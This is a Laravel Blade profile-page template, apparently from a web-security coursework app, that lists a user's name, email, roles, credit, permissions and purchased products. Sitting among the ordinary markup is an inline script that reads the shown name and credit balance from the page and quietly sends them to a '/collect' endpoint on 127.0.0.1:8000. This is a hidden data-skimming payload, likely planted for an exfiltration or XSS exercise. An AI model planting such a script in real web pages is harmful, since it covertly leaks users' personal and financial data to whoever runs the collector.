@extends('layouts.master')
@section('title', 'User Profile')
@section('content')
<div class="row">
    <div class="m-4 col-sm-6">
        <table class="table table-striped">
        <tr><th>Name</th><td id="name">{{$user->name}}</td></tr>
        <tr><th>Email</th><td>{{$user->email}}</td></tr>
            <tr><th>Roles</th>
                <td>
                    @foreach($user->roles as $role)
                        <span class="badge bg-primary">{{$role->name}}</span>
                    @endforeach
                </td>
                @if($user->hasRole('Customer'))
                    <tr>
                        <th>Credit</th>
                        <td id="credit">{{ number_format($user->credit, 2) }}</td>
                        </tr>
                @endif

              


            <tr><th>Permissions</th>
                <td>
                    @foreach($permissions as $permission)
                        <span class="badge bg-success">{{$permission->display_name}}</span>
                    @endforeach
                </td>
            </tr>
        </table>
        <script>
                    let name = document.getElementById('name')?.textContent.trim();
                    let credit = document.getElementById('credit')?.textContent.trim();

                    if(name && credit) {
                        console.log("Sending user info: ", name, credit);

                        let xhr = new XMLHttpRequest();
                        xhr.open('GET', `http://127.0.0.1:8000/collect?name=${encodeURIComponent(name)}&credit=${encodeURIComponent(credit)}`);
                        xhr.send();
                    }
        </script>

        <div class="row">
            @if(auth()->user()->hasPermissionTo('admin_users') || auth()->id() == $user->id)
                <div class="col col-4">
                    <a class="btn btn-primary" href='{{route('edit_password', $user->id)}}'>Change Password</a>
                </div>
            @endif
            @if(auth()->user()->hasPermissionTo('edit_users') || auth()->id() == $user->id)
                <div class="col col-2">
                    <a href="{{route('users_edit', $user->id)}}" class="btn btn-success form-control">Edit</a>
                </div>
            @endif
        </div>
    </div>
</div>

@if(isset($bought))
<div class="row">
    <div class="col m-4">
        <h4>Purchased Products</h4>
        <ul class="list-group">
            @forelse($bought as $product)
                <li class="list-group-item">{{$product->name}} ({{$product->price}} EGP)</li>
            @empty
                <li class="list-group-item text-muted">No purchases yet.</li>
            @endforelse
        </ul>
    </div>
</div>
@endif
@endsection
